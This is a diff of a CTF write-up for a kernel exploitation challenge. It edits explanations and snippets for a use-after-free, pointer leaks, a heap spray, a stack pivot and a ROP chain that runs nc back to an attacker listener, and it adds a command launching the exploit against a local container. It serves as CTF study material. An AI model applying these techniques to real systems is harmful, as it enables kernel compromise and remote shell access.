@@ -213,7 +213,7 @@
           <p>704 lines of C across the three, each doing one job.</p>
 
           <h3>nkrcu.ko</h3>
-          <p>The object store — descriptor allocator, an RCU-protected list, a snapshot array, a spray allocator, and a <code>synchronize_rcu()</code> wrapper.</p>
+          <p>The object store — descriptor allocator, an RCU-protected list, a snapshot array, a spray allocator, a <code>synchronize_rcu()</code> wrapper, and a read-only <code>/proc/nephilim/layout</code> that no remote command can reach.</p>
           <pre><code>struct nk_desc {
     uint64_t              id;         /* +0   also the qword the pivot loads into rsp */
     uint32_t              state;      /* +8                                           */
@@ -234,7 +234,7 @@ __attribute__((naked)) void nkrcu_pivot(void)
         "ret\n\t"
     );
 }</code></pre>
-          <p>Four bytes — <code>48 8b 27</code>, <code>c3</code>. The byte sequence appears nowhere in this vmlinux, and neither do the obvious <code>mov (%rXX),%rsp ; ret</code> variants.</p>
+          <p>Four bytes — <code>48 8b 27</code>, <code>c3</code>. The byte sequence appears nowhere in this vmlinux, and neither do the other <code>mov (%rXX),%rsp ; ret</code> forms. <code>pop %rsp ; ret</code> and <code>leave ; ret</code> are both plentiful, but they source the new <code>rsp</code> from the kworker stack, and at the indirect call only <code>rdi</code> is under control.</p>
 
           <h3>nkmon.ko</h3>
           <p>A timer re-arms every <code>5 * HZ</code> and schedules work. The work function makes one indirect call per snapshot:</p>
@@ -246,8 +246,14 @@ __attribute__((naked)) void nkrcu_pivot(void)
 }</code></pre>
           <p>Compiled, it is a tail jump with the descriptor already in <code>rdi</code>:</p>
           <pre><code>0:  48 8b 7f 08   mov 0x8(%rdi),%rdi          ; snap-&gt;desc
+4:  48 85 ff      test %rdi,%rdi
+7:  74 16         je 1f
 9:  48 8b 47 10   mov 0x10(%rdi),%rax         ; desc-&gt;ops
+d:  48 85 c0      test %rax,%rax
+10: 74 0d         je 1f
 12: 48 8b 00      mov (%rax),%rax             ; ops-&gt;validate
+15: 48 85 c0      test %rax,%rax
+18: 74 05         je 1f
 1a: e9 ...        jmp __x86_indirect_thunk_rax</code></pre>
           <p>Two of those checks are everything the fake object has to satisfy — a non-NULL <code>ops</code> and a non-NULL <code>ops-&gt;validate</code>. The third is fixed by construction.</p>
           <p>One comment carries more weight than it looks:</p>
@@ -266,7 +272,7 @@ seq  = ntohs(h-&gt;seq);
 
 if ((int)(sizeof(*h) + plen) &gt; len)
     return;</code></pre>
-          <p>The checksum is computed on responses but never verified on input — so nobody notices it is decorative.</p>
+          <p>The checksum is computed on responses but never verified on input — so nobody notices it is decorative. The exploit below fills it in anyway, which costs nothing and keeps a capture readable.</p>
         </section>
 
         <section id="bug">
@@ -298,9 +304,10 @@ call_rcu(&amp;desc-&gt;rcu_head, nk_desc_free_rcu);   /* kfree after the grace p
           </div>
           <p>The sweep alone is not enough. <code>nkrcu_snap_iter()</code> copies the array under the spinlock and runs the callback outside it, by design, so the monitor can sleep:</p>
           <pre><code>spin_lock_bh(&amp;nk_snap_lock);
-for (i = 0; i &lt; NK_MAX_SNAPS; i++)
+for (i = 0; i &lt; NK_MAX_SNAPS; i++) {
     if (nk_snaps[i].snap_id)
         local[n++] = nk_snaps[i];
+}
 spin_unlock_bh(&amp;nk_snap_lock);
 
 for (i = 0; i &lt; n; i++)
@@ -317,7 +324,7 @@ pivot_fn  = u64(resp, 32)   # &amp;nkrcu_pivot
 
 kernel_base = kernel_fn - PRINTK_OFF</code></pre>
           <p>One read yields two independently randomized bases and three useful pointers — kernel <code>_text</code>, and the module region through both <code>pivot_fn</code> and <code>ops</code>. Module base is randomized separately from <code>_text</code>, so <code>pivot_fn</code> has to be leaked, not computed.</p>
-          <p><code>CMD_SPRAY_A</code> allocates 128 bytes with <code>GFP_ATOMIC</code> and copies 128 attacker bytes in — the same <code>kmalloc-128</code> cache as <code>struct nk_desc</code>. <code>CONFIG_MEMCG</code> is off, so there is no <code>kmalloc-cg-128</code> split.</p>
+          <p><code>CMD_SPRAY_A</code> allocates 128 bytes with <code>GFP_ATOMIC</code> and copies 128 attacker bytes in — the same <code>kmalloc-128</code> cache as <code>struct nk_desc</code>. Neither allocation carries <code>__GFP_ACCOUNT</code>, and <code>CONFIG_MEMCG</code> is off in this build, so there is no <code>kmalloc-cg-128</code> for either one to drift into.</p>
           <p>The ROP payload is self-referential: <code>argv</code> points at <code>rop_kaddr + 80</code>, and the <code>argv[]</code> entries live in the same buffer. But <code>CMD_SPRAY_A</code> copies the content before it reveals the address. The way out is a probe — allocate zeroes to learn an address, free it, re-allocate with content written for that address:</p>
           <pre><code>for attempt in range(1, 32):
     resp = send_cmd(CMD_SPRAY_A, b"\x00" * 128)
@@ -328,10 +335,12 @@ kernel_base = kernel_fn - PRINTK_OFF</code></pre>
     rop_kaddr = u64(resp)
 
     if rop_kaddr == candidate:
-        return str_kaddr, rop_kaddr</code></pre>
+        return str_kaddr, rop_kaddr
+
+    send_cmd(CMD_SPRAY_F, p64(rop_kaddr))   # miss: free and go again</code></pre>
           <p>Under SLUB's per-CPU LIFO freelist the object comes straight back — provided it belonged to the slab the CPU is currently allocating from. If it did not, <code>kfree()</code> puts it on that slab's own freelist and the next <code>kmalloc(128)</code> hands back a different address.</p>
           <p>That is what the loop absorbs. Real competition is negligible here: the guest is an idle busybox initramfs on one vCPU, and nothing on the packet path touches <code>kmalloc-128</code> — <code>struct sk_buff</code> comes from the unmergeable <code>skbuff_head_cache</code>, and any <code>__alloc_skb</code> head carries a 320-byte <code>skb_shared_info</code>.</p>
-          <p>The comments in the script below blame Docker and netfilter for the same thing. They are wrong twice over — the guest has netfilter compiled out, and host-side activity cannot reach the guest's freelists at all.</p>
+          <p>The comments in the script below blame Docker and netfilter for the same thing. They are wrong twice over — the guest has netfilter compiled out, and host-side activity cannot reach the guest's freelists at all. The retry loops they justify are still worth keeping, because slab placement is what they actually absorb, and in practice both sprays land on the first attempt.</p>
           <p>Triggering the free is three commands in a fixed order:</p>
           <pre><code>send_cmd(CMD_SNAP,   p64(desc_id))   # nk_snaps[0].desc = desc_kaddr
 send_cmd(CMD_REMOVE, p64(desc_id))   # list_del_rcu + call_rcu
@@ -358,9 +367,9 @@ nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
               ret                                ; first ROP entry</code></pre>
           <p>The tail jump means no argument shuffling. The pivot replaces <code>rsp</code> wholesale, abandoning the kworker stack.</p>
           <p>What it lands on is a 128-byte slab object. <code>call_usermodehelper</code> then blocks in <code>UMH_WAIT_PROC</code> for the lifetime of <code>nc</code>, with its frames growing down past <code>rop_kaddr</code> into whatever neighbours it.</p>
-          <p>It survives because of the direction the freelist handed addresses out. The ROP object is the lowest of the three — <code>rop_kaddr</code>, then the strings, then the descriptor.</p>
-          <p>So <code>argv[]</code>, the paths and the fake object all sit above <code>rsp</code> and are never touched. The frames descend onto unrelated objects that nothing in an idle guest reads.</p>
-          <p>Had the spray gone the other way, the kworker would have smashed the <code>argv</code> strings before the helper copied them. A run that needs several attempts also leaves freed <code>kmalloc-128</code> objects in exactly that region.</p>
+          <p>The <code>argv[]</code> array is built inside the ROP object at <code>rop_kaddr+80</code>, above the <code>rsp</code> the chain leaves behind, so descending frames cannot reach it whatever the freelist does.</p>
+          <p>The strings it points at are a separate object, and that one is placed wherever the allocator felt like. Here it came back <code>0x80</code> above the ROP object, so it sits above <code>rsp</code> too. The frames descend onto unrelated objects that nothing in an idle guest reads.</p>
+          <p>Had the spray gone the other way, the kworker would have smashed the <code>argv</code> strings before exec reached them. <code>call_usermodehelper</code> stores <code>path</code> and <code>argv</code> as pointers in <code>struct subprocess_info</code> and the helper thread dereferences them later, so the bytes have to survive the whole wait. A run that needs several attempts also leaves freed <code>kmalloc-128</code> objects in exactly that region.</p>
           <pre><code>#!/usr/bin/env python3
 # NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
 #
@@ -639,6 +648,8 @@ def main():
 
 if __name__ == "__main__":
     main()</code></pre>
+          <p>Against a local container, with the listener on the Docker bridge address:</p>
+          <pre><code>python3 exploit.py 127.0.0.1 31337 172.17.0.1 4444</code></pre>
           <p>Expected output:</p>
           <pre><code>NEPHILIM | 127.0.0.1:31337 -&gt; 172.17.0.1:4444
 
@@ -699,6 +710,8 @@ CTF{&lt;64 hex chars&gt;}</code></pre>
           <p>One team went through <code>CMD_INFO</code> instead. The read primitive is rigid:</p>
           <pre><code>int nkrcu_info(uint64_t desc_id, uint8_t *out, size_t out_len)
 {
+    struct nk_desc *desc;
+
     if (out_len &lt; 40)
         return -EINVAL;
 
